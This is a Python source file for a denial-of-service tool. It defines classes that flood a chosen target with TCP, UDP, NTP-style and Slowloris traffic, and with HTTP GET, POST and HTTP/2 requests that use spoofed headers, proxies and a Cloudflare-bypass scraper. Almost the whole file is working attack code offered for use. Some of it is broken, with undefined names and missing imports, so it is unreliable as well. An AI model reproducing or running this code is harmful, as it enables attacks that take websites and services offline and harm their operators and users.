import asyncio
import socket
from threading import Thread, Event
from time import time, sleep
import random
from urllib.parse import urlparse
from h2.connection import H2Connection
from h2.events import ResponseReceived
from .utils import randbytes, humanbytes
from cloudscraper import create_scraper
import psutil

class AttackBase(Thread):
    def __init__(self, target, method, proxies=None, threads=1000, duration=60):
        super().__init__(daemon=True)
        self.target = target
        self.method = method.upper()
        self.proxies = proxies or []
        self.event = Event()
        self.duration = duration
        self.threads = min(threads, psutil.cpu_count() * 200)
        self.bytes_sent = 0
        self.requests_sent = 0

    def get_socket(self, ssl=False):
        proxy = random.choice(self.proxies) if self.proxies else None
        sock = proxy.open_socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP) if proxy else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(0.9)
        return sock

class Layer4Attack(AttackBase):
    def run(self):
        self.event.wait()
        end_time = time() + self.duration
        if isinstance(self.target, str):
            host, port = self.target.split(":")
            self.target = (socket.gethostbyname(host), int(port))
        methods = {
            "TCP": self.tcp_flood,
            "UDP": self.udp_flood,
            "NTP": self.ntp_amplification,
            "SLOWLORIS": self.slowloris
        }
        if self.method in methods:
            while time() < end_time and self.event.is_set():
                methods[self.method]()
        else:
            logger.error(f"Method {self.method} not supported.")

    def tcp_flood(self):
        with suppress(Exception), self.get_socket() as sock:
            sock.connect(self.target)
            while self.event.is_set():
                sent = sock.send(randbytes(2048))  # Payload lớn hơn
                self.bytes_sent += sent
                self.requests_sent += 1

    def udp_flood(self):
        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while self.event.is_set():
                sent = sock.sendto(randbytes(2048), self.target)
                self.bytes_sent += sent
                self.requests_sent += 1

    def ntp_amplification(self):
        # Payload NTP amplification
        payload = b'\x17\x00\x03\x2a' + randbytes(4)
        with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while self.event.is_set():
                sent = sock.sendto(payload, self.target)
                self.bytes_sent += sent
                self.requests_sent += 1

    def slowloris(self):
        sockets = []
        with suppress(Exception):
            for _ in range(min(self.threads, 500)):
                sock = self.get_socket()
                sock.connect(self.target)
                sock.send(f"GET / HTTP/1.1\r\nHost: {self.target[0]}\r\n".encode())
                sockets.append(sock)
            while self.event.is_set():
                for sock in sockets[:]:
                    try:
                        sock.send(b"X-a: \r\n")
                        self.bytes_sent += 6
                        self.requests_sent += 1
                    except:
                        sockets.remove(sock)
                sleep(1)

class Layer7Attack(AttackBase):
    def run(self):
        self.event.wait()
        end_time = time() + self.duration
        parsed = urlparse(self.target)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        methods = {
            "HTTP2": self.http2_flood,
            "GET": self.http_get,
            "POST": self.http_post,
            "CFB": self.cloudflare_bypass
        }
        if self.method in methods:
            while time() < end_time and self.event.is_set():
                methods[self.method]()
        else:
            logger.error(f"Method {self.method} not supported.")

    def http_get(self):
        headers = "\r\n".join([
            f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/90.0'])}",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}"
        ])
        with suppress(Exception), self.get_socket(parsed.scheme == "https") as sock:
            sock.connect((self.host, self.port))
            payload = f"GET {parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n{headers}\r\n\r\n".encode()
            sent = sock.send(payload)
            self.bytes_sent += sent
            self.requests_sent += 1

    def http2_flood(self):
        with suppress(Exception), self.get_socket(True) as sock:
            sock.connect((self.host, self.port))
            conn = H2Connection()
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            for _ in range(10):  # Multiplexing nhiều stream
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, {":method": "GET", ":path": parsed.path or "/", ":authority": self.host})
                self.requests_sent += 1
                self.bytes_sent += len(conn.data_to_send())
                sock.send(conn.data_to_send())
            sleep(0.1)

    def http_post(self):
        with suppress(Exception), self.get_socket(parsed.scheme == "https") as sock:
            sock.connect((self.host, self.port))
            payload = f"POST {parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 2048\r\n\r\n{randbytes(2048).decode('latin1')}".encode()
            sent = sock.send(payload)
            self.bytes_sent += sent
            self.requests_sent += 1

    def cloudflare_bypass(self):
        with suppress(Exception), create_scraper() as scraper:
            proxy = random.choice(self.proxies).asRequest() if self.proxies else None
            resp = scraper.get(self.target, proxies=proxy)
            self.bytes_sent += len(resp.request.body or b"")
            self.requests_sent += 1